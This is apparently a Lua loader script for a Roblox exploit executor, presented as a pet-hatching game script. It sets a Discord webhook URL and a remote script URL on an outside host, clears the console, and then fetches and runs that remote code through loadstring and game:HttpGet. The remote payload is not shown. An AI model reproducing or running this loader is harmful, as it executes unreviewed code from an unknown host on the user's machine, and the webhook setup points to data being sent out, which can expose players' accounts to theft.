--// Loader
getgenv().Config = {
    Webhook = "https://discord.com/api/webhooks/",
    ScriptURL = "https://russia.1ms.network/rblx/webhook.lua"
}

if rconsoleclear then rconsoleclear() end

print("Starting: Hatching Scripts")
loadstring(game:HttpGet(getgenv().Config.ScriptURL))()
